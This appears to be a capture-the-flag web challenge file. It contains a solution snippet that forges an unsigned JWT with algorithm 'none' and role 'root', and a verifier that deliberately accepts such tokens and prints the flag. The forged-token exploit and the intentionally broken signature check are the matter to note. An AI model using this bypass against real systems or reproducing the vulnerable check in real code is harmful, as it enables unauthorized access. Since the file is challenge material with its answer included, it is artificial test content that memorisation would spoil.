// Craft unsigned JWT: header.payload. with alg: none and role: root
const h = btoa(JSON.stringify({ alg: 'none', typ: 'JWT' }));
const p = btoa(JSON.stringify({ user: 'admin', role: 'root' }));
verifyJWT(h + '.' + p + '.');

/jwt_verifier.js.content:
function verifyJWT(token) {
  const parts = token.split('.');
  if (parts.length >= 2) {
    try {
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      if (header.alg === 'none' && payload.role === 'root') {
        document.getElementById('jwt-status').innerText = 'FLAG: WEB_JWT_NONE_ALG_51';
      }
    } catch(e) {}
  }
}
window.addEventListener('load', () => verifyJWT(''));

